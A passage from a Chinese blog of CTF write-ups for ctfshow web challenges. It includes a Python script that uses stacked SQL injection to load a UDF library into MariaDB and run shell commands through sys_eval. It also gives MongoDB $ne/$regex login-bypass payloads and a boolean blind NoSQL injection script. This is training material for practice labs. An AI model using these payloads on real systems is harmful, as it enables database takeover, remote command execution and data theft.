class="number">5000</span>):</span><br><span class="line">    end = i+<span class="number">5000</span></span><br><span class="line">    udf_text.append(udf[i:end])</span><br><span class="line"></span><br><span class="line">p = dict(zip(text,udf_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> text:</span><br><span class="line">    param=payload.format(p[t],t)</span><br><span class="line">    get_url = url + param</span><br><span class="line">    res = requests.get(get_url)</span><br><span class="line">    print(<span class="string">"[*]"</span>,end=<span class="string">""</span>)</span><br><span class="line">    code = res.status_code</span><br><span class="line">    print(code,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span>  code==<span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"你输入的URL可能出错"</span>)</span><br><span class="line">    acq=acquire.format(t)</span><br><span class="line">    data=url+acq</span><br><span class="line">    res = requests.get(url=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"load_file"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">"--&gt;成功插入&#123;&#125;.txt"</span>.format(t))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]导入udf.so成功"</span>)</span><br><span class="line">url_sys_dll = <span class="string">"?id=1%27;select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so' --+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_dll)</span><br><span class="line">print(<span class="string">"[*]创建函数sys_eval()成功"</span>)</span><br><span class="line">url_sys_function = <span class="string">"?id=1%27;create function sys_eval returns string soname 'udf.so'--+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_function)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]命令执行结果: "</span>)</span><br><span class="line">sys_eval=<span class="string">"?id=';select sys_eval('cat /flag.*')--+"</span></span><br><span class="line">res= requests.get(url=url+sys_eval)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803114942859.png" alt="image-20210803114942859"></p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><blockquote>
<ul>
<li>nosql,也跟MongoDB一个意思，先去补补MongoDB的基础知识，<a href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">MongoDB基础</a></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;无</span><br><span class="line">$user &#x3D; $memcache-&gt;get($id);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210804163303545.png" alt="image-20210804163303545"></p>
<blockquote>
<p>由于他校验的是第一个输入的数据，对于非空的数组，intval会返回1，所以可以绕过intval校验，然后再来搜flag，就可以搜索key为flag的值了</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;flag</span><br></pre></td></tr></table></figure></div>

<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $query &#x3D; new MongoDB\Driver\Query($data);</span><br><span class="line">  $cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;无过滤</span><br><span class="line">  if(count($cursor)&gt;0)&#123;</span><br><span class="line">    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;</span><br><span class="line">    array_push($ret[&#39;data&#39;], $flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>他传入的data是username和password，所以想要这个返回值为真，我们就要构造永真式，利用ne（not equal）来让这个式子一直是真的，就为1就绕过了</p>
</blockquote>
<p><strong>post传入payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]&#x3D;hacker&amp;password[$ne]&#x3D;hacker</span><br></pre></td></tr></table></figure></div>

<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><blockquote>
<ul>
<li>感觉和上题一样，那就换个永真式</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]&#x3D;.*&amp;password[$regex]&#x3D;.*</span><br></pre></td></tr></table></figure></div>

<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><blockquote>
<ul>
<li>这题和上题有点区别，利用永真式获得了账号和密码，登陆并没有获取flag，用正则找一下</li>
</ul>
</blockquote>
<p>payload，找以f开头的用户名就找到了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]&#x3D;f.*&amp;password[$ne]&#x3D;1</span><br></pre></td></tr></table></figure></div>

<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><blockquote>
<ul>
<li>这题跟上面几题有点不同，可以登录成功，但是无回显。所以我们可以通过正则匹配来判断这个是否存在。</li>
</ul>
</blockquote>
<p>明显，账号数据中存在flag，因为显示的msg是登录成功<img src="https://gylq.gitee.io/cloudimages/img/image-20210804144108579.png" alt="image-20210804144108579"></p>
<p>因此我们利用这个回显，写个布尔盲注脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/4</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload_user = <span class="string">"flag.*"</span></span><br><span class="line">payload_pass = <span class="string">"^&#123;&#125;.*"</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username[$regex]'</span>:payload_user,</span><br><span class="line">            <span class="string">'password[$regex]'</span>:payload_pass.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u767b\u9646\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210804162826968.png" alt="image-20210804162826968"></p>


        

      
    </div>

      <!-- 相关文章推荐 -->
     

    
    
    

    <div>
          
            
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

  <!-- JS库 sweetalert 可修改路径 -->
  <script src="/js/src/jquery.min.js"></script>
  <script src="/js/src/sweetalert.min.js"></script>
  <p><span>本文标题:</span><a href="/posts/88.html">【ctfshow】web篇-SQL注入 wp</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 孤桜懶契 的个人博客">孤桜懶契</a></p>
  <p><span>发布时间:</span>2021年08月09日 - 07:19:42</p>
  <p><span>最后更新:</span>2022年05月20日 - 11:47:45</p>
  <p><span>原始链接:</span><a href="/posts/88.html" title="【ctfshow】web篇-SQL注入 wp">https://gylq.gitee.io/posts/88.html</a>
    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://gylq.gitee.io/posts/88.html"  aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
</div>
<script>
    var clipboard = new Clipboard('.fa-clipboard');
    $(".fa-clipboard").click(function(){
      clipboard.on('success', function(){
        swal({
          title: "",
          text: '复制成功',
          icon: "success",
          showConfirmButton: true
          });
    });
    });
</script>


          
    </div>

    

    <div>
      
        <div>
    
        <div class="read-over">-------------------本文结束 <i class="fa fa-paw"></i> 感谢您的阅读-------------------</div>
    
</div>

      
    </div>

    
      <div>
        <div class="share_reward">
  <div>坚持原创技术分享，感谢您的支持和鼓励！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="孤桜懶契 微信支付"/>
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="孤桜懶契 支付宝"/>
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag"> <i class="fa fa-tag"></i> 学习记录</a>
          
            <a href="/tags/ctf/" rel="tag"> <i class="fa fa-tag"></i> ctf</a>
          
            <a href="/tags/web/" rel="tag"> <i class="fa fa-tag"></i> web</a>
          
            <a href="/tags/ctfshow/" rel="tag"> <i class="fa fa-tag"></i> ctfshow</a>
          
        </div>
      

      
      
        <div class="post-widgets">
        
          <div class="wp_rating">
            <div style="color:rgba(0,0,0,.75);font-size:13px;letter-spacing:4px;margin-bottom:5px;">(&gt;看完记得五星好评哦亲&lt;)</div>
            <div id="wpac-rating"></div>
          </div>
        

        

        
        </div>
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/posts/71.html" rel="prev" title="【ctfshow】web篇-XSS wp">
                <i class="fa fa-chevron-left"></i> 【ctfshow】web篇-XSS wp
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/posts/97.html" rel="next" title="【ctfshow】web篇-文件上传 wp">
                【ctfshow】web篇-文件上传 wp <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
         <div
  data-weibo-title="分享到微博"
  data-qq-title="分享到QQ"
  data-douban-title="分享到豆瓣"
  class="social-share"
  class="share-component"



  data-disabled="qzone,google+,linkedin"
  data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣...">
   分享到：
</div>


      
    </div>
  </div>


		  </div>
		</div>
	


	

  
    <div class="comments" id="comments">
    </div>
  





	
<script src="https://readmore.openwrite.cn/js/readmore.js" type="text/javascript"></script>
<script>
    const btw = new BTWPlugin();
    btw.init({
        id: 'container',
        blogId: '23138-1631285680758-213',
        name: '渗透安全团队',
        qrcode: 'https://gylq.gitee.io/cloudimages/img/mmexport1627522419167.jpg',
        keyword: 'vip',
    });
</script>

	</div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <a href="/">
              <img class="site-author-image" itemprop="image"
                src="/images/qq.png"
                alt="孤桜懶契" />
              </a>
            
              <p class="site-author-name" itemprop="name">孤桜懶契</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">203</span>
                  <span class="site-state-item-name">文章</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">123</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
              <!-- 为Hexo Next主题添加哈林摇特效  -->
              <a title="收藏到书签，偶尔High一下^_^" rel="alternate" class="mw-harlem_shake_slow wobble shake" href="javascript:void(0)" onclick="javascript:(function go() {function c() {var e = document.createElement('link');e.setAttribute('type', 'text/css');e.setAttribute('rel', 'stylesheet');e.setAttribute('href', f);e.setAttribute('class', l);document.body.appendChild(e)}function h(){var e = document.getElementsByClassName(l);for(var t = 0; t< e.length; t++){document.body.removeChild(e[t])}}function p(){var e = document.createElement('div');e.setAttribute('class', a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s = d(i);return s.height>e &amp;&amp;s.height<n &amp;&amp; s.width>t &amp;&amp;s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t.offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e &amp;&amp; !isNaN(e.clientHeight)){return e.clientHeight}return 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w &amp;&amp; t<=b+w}var songs=['https://www.liaofuzhan.com/music/无尽光芒.mp3'];function S(){var e=document.getElementById('audio_element_id');if(e!=null){var index=parseInt(e.getAttribute('curSongIndex'));if(index>songs.length-2){index=0;}else{index++;}e.setAttribute('curSongIndex',index);N();}e.src=i;e.play()}function x(e){e.className+=' '+s+' '+o}function T(e){e.className+=' '+s+' '+u[Math.floor(Math.random()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp('\\b'+s+'\\b');for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,'')}}function initAudioEle(){var e=document.getElementById('audio_element_id');if(e===null){e=document.createElement('audio');e.setAttribute('class',l);e.setAttribute('curSongIndex',0);e.id='audio_element_id';e.loop=false;e.bgcolor=0;e.addEventListener('canplay',function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener('ended',function(){N();h();go();},true);e.innerHTML='<p>If you are reading this,it is because your browser does not support the audio element. We recommend that you get a new browser.</p><p>';document.body.appendChild(e);}}initAudioEle();var e=30;var t=30;var n=350;var r=350;var curSongIndex=parseInt(document.getElementById('audio_element_id').getAttribute('curSongIndex'));var i=songs[curSongIndex];var s='mw-harlem_shake_me';var o='im_first';var u=['im_drunk','im_baked','im_trippin','im_blown'];var a='mw-strobe_light';var f='https://s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css';var l='mw_added_css';var b=g();var w=y();var C=document.getElementsByTagName('*');var k=null;for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn('Could not find a node of the right size. Please try a different page.');return}c();S();var O=[];for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){O.push(A)}}})()"><i class="fa fa-music"></i> High~</a>

            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a rel="external nofollow" href="https://github.com/GYLQ/GYLQ.github.io" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a rel="external nofollow" href="mailto:2324298829@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a rel="external nofollow" href="https://t.me/GuYingLanQi" target="_blank" title="telegram">
                      
                        <i class="fa fa-fw fa-telegram"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a rel="external nofollow" href="https://mobile.twitter.com/9mGGrn8tDvq6ZhY" target="_blank" title="twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a rel="external nofollow" href="https://space.bilibili.com/13563835" target="_blank" title="哔哩哔哩">
                      
                        <i class="fa fa-fw fa-apple"></i></a>
                  </span>
                
            </div>
          

            <!--
            <div id="music163player">
                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1336790004&auto=1&height=66"></iframe>
            </div>
            -->

          
          

          
          

          <!--近期文章版块 began-->
          
              <div class="links-of-blogroll motion-element links-of-blogroll-block">
                <div class="links-of-blogroll-title">
                  <i class="fa fa-history fa-" aria-hidden="true"></i>
                  近期文章
                </div>
                <ul class="links-of-blogroll-list">
                  
                  
                    <li class='my-links-of-blogroll-li'>
                      <a href="/posts/202.html" title="【漏扫工具】渗透测试常用工具集整理（包含xray、awvs等）" target="_blank">【漏扫工具】渗透测试常用工具集整理（包含xray、awvs等）</a>
                    </li>
                  
                    <li class='my-links-of-blogroll-li'>
                      <a href="/posts/201.html" title="【应急靶场实践】Ubuntu-暴力破解、写入ssh公钥留后门、植入GPU挖矿程序——事件复现（含靶场环境）" target="_blank">【应急靶场实践】Ubuntu-暴力破解、写入ssh公钥留后门、植入GPU挖矿程序——事件复现（含靶场环境）</a>
                    </li>
                  
                    <li class='my-links-of-blogroll-li'>
                      <a href="/posts/200.html" title="【渗透靶场实践】Win2008-暴力破解、留后门隐藏账户与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）" target="_blank">【渗透靶场实践】Win2008-暴力破解、留后门隐藏账户与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）</a>
                    </li>
                  
                    <li class='my-links-of-blogroll-li'>
                      <a href="/posts/199.html" title="【应急靶场实践】Win2008-暴力破解、留隐藏账户后门与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）" target="_blank">【应急靶场实践】Win2008-暴力破解、留隐藏账户后门与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）</a>
                    </li>
                  
                    <li class='my-links-of-blogroll-li'>
                      <a href="/posts/198.html" title="【渗透靶场实践】Linux-暴力破解、替换ps命令、留多个后门——事件复现（含靶场环境）" target="_blank">【渗透靶场实践】Linux-暴力破解、替换ps命令、留多个后门——事件复现（含靶场环境）</a>
                    </li>
                  
                </ul>
              </div>
          
          <!--近期文章版块 end-->

          
              <!-- canvas粒子时钟 -->
              <!-- canvas粒子时钟 https://www.cnblogs.com/xiaohuochai/p/6368039.html
  https://www.html5tricks.com/html5-canvas-dance-time.html
 -->
<div id="">
  <canvas id="canvas" style="width:60%;">
</div>
<script async>
(function(){
  var WINDOW_WIDTH = 820;
  		var WINDOW_HEIGHT = 250;
  		var RADIUS = 7; //球半径
  		var NUMBER_GAP = 10; //数字之间的间隙
  		var u=0.65; //碰撞能量损耗系数
  		var context; //Canvas绘制上下文
  		var balls = []; //存储彩色的小球
  		const colors = ["#33B5E5","#0099CC","#AA66CC","#9933CC","#99CC00","#669900","#FFBB33","#FF8800","#FF4444","#CC0000"]; //彩色小球的颜色
  		var currentNums = []; //屏幕显示的8个字符
  		var digit =
                  [
                      [
                          [0,0,1,1,1,0,0],
                          [0,1,1,0,1,1,0],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,0,1,1,0],
                          [0,0,1,1,1,0,0]
                      ],//0
                      [
                          [0,0,0,1,1,0,0],
                          [0,1,1,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [1,1,1,1,1,1,1]
                      ],//1
                      [
                          [0,1,1,1,1,1,0],
                          [1,1,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,0,0],
                          [0,0,1,1,0,0,0],
                          [0,1,1,0,0,0,0],
                          [1,1,0,0,0,0,0],
                          [1,1,0,0,0,1,1],
                          [1,1,1,1,1,1,1]
                      ],//2
                      [
                          [1,1,1,1,1,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,0,0],
                          [0,0,1,1,1,0,0],
                          [0,0,0,0,1,1,0],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,1,1,0]
                      ],//3
                      [
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,1,0],
                          [0,0,1,1,1,1,0],
                          [0,1,1,0,1,1,0],
                          [1,1,0,0,1,1,0],
                          [1,1,1,1,1,1,1],
                          [0,0,0,0,1,1,0],
                          [0,0,0,0,1,1,0],
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,1,1]
                      ],//4
                      [
                          [1,1,1,1,1,1,1],
                          [1,1,0,0,0,0,0],
                          [1,1,0,0,0,0,0],
                          [1,1,1,1,1,1,0],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,1,1,0]
                      ],//5
                      [
                          [0,0,0,0,1,1,0],
                          [0,0,1,1,0,0,0],
                          [0,1,1,0,0,0,0],
                          [1,1,0,0,0,0,0],
                          [1,1,0,1,1,1,0],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,1,1,0]
                      ],//6
                      [
                          [1,1,1,1,1,1,1],
                          [1,1,0,0,0,1,1],
                          [0,0,0,0,1,1,0],
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,0,0],
                          [0,0,0,1,1,0,0],
                          [0,0,1,1,0,0,0],
                          [0,0,1,1,0,0,0],
                          [0,0,1,1,0,0,0],
                          [0,0,1,1,0,0,0]
                      ],//7
                      [
                          [0,1,1,1,1,1,0],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,1,1,0],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,1,1,0]
                      ],//8
                      [
                          [0,1,1,1,1,1,0],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [1,1,0,0,0,1,1],
                          [0,1,1,1,0,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,0,1,1],
                          [0,0,0,0,1,1,0],
                          [0,0,0,1,1,0,0],
                          [0,1,1,0,0,0,0]
                      ],//9
                      [
                          [0,0,0,0],
                          [0,0,0,0],
                          [0,1,1,0],
                          [0,1,1,0],
                          [0,0,0,0],
                          [0,0,0,0],
                          [0,1,1,0],
                          [0,1,1,0],
                          [0,0,0,0],
                          [0,0,0,0]
                      ]//:
                  ];

  		function drawDatetime(cxt){
  			var nums = [];

  			context.fillStyle="#005eac"
  			var date = new Date();
  			var offsetX = 70, offsetY = 30;
  			var hours = date.getHours();
  			var num1 = Math.floor(hours/10);
  			var num2 = hours%10;
  			nums.push({num: num1});
  			nums.push({num: num2});
  			nums.push({num: 10}); //冒号
  			var minutes = date.getMinutes();
  			var num1 = Math.floor(minutes/10);
  			var num2 = minutes%10;
  			nums.push({num: num1});
  			nums.push({num: num2});
  			nums.push({num: 10}); //冒号
  			var seconds = date.getSeconds();
  			var num1 = Math.floor(seconds/10);
  			var num2 = seconds%10;
  			nums.push({num: num1});
  			nums.push({num: num2});

  			for(var x = 0;x<nums.length;x++){
  				nums[x].offsetX = offsetX;
  				offsetX = drawSingleNumber(offsetX,offsetY, nums[x].num,cxt);
  				//两个数字连一块，应该间隔一些距离
  				if(x<nums.length-1){
  					if((nums[x].num!=10) &&(nums[x+1].num!=10)){
  						offsetX+=NUMBER_GAP;
  					}
  				}
  			}

  			//说明这是初始化
  			if(currentNums.length ==0){
  				currentNums = nums;
  			}else{
  				//进行比较
  				for(var index = 0;index<currentNums.length;index++){
  					if(currentNums[index].num!=nums[index].num){
  						//不一样时，添加彩色小球
  						addBalls(nums[index]);
  						currentNums[index].num=nums[index].num;
  					}
  				}
  			}
  			renderBalls(cxt);
  			updateBalls();

  			return date;
  		}

  		function addBalls (item) {
  			var num = item.num;
  			var numMatrix = digit[num];
  			for(var y = 0;y<numMatrix.length;y++){
  				for(var x = 0;x<numMatrix[y].length;x++){
  					if(numMatrix[y][x]==1){
  						var ball={
  							offsetX:item.offsetX+RADIUS+RADIUS*2*x,
  							offsetY:30+RADIUS+RADIUS*2*y,
  							color:colors[Math.floor(Math.random()*colors.length)],
  							g:1.5+Math.random(),
  							vx:Math.pow(-1, Math.ceil(Math.random()*10))*4+Math.random(),
  							vy:-5
  						}
  						balls.push(ball);
  					}
  				}
  			}
  		}

  		function renderBalls(cxt){
  			for(var index = 0;index<balls.length;index++){
  				cxt.beginPath();
  				cxt.fillStyle=balls[index].color;
  				cxt.arc(balls[index].offsetX, balls[index].offsetY, RADIUS, 0, 2*Math.PI);
  				cxt.fill();
  			}
  		}

  		function updateBalls () {
  			var i =0;
  			for(var index = 0;index<balls.length;index++){
  				var ball = balls[index];
  				ball.offsetX += ball.vx;
  				ball.offsetY += ball.vy;
  				ball.vy+=ball.g;
  				if(ball.offsetY > (WINDOW_HEIGHT-RADIUS)){
  					ball.offsetY= WINDOW_HEIGHT-RADIUS;
  					ball.vy=-ball.vy*u;
  				}
  				if(ball.offsetX>RADIUS&&ball.offsetX<(WINDOW_WIDTH-RADIUS)){

  					balls[i]=balls[index];
  					i++;
  				}
  			}
  			//去除出边界的球
  			for(;i<balls.length;i++){
  				balls.pop();
  			}
  		}
  		function drawSingleNumber(offsetX, offsetY, num, cxt){
  			var numMatrix = digit[num];
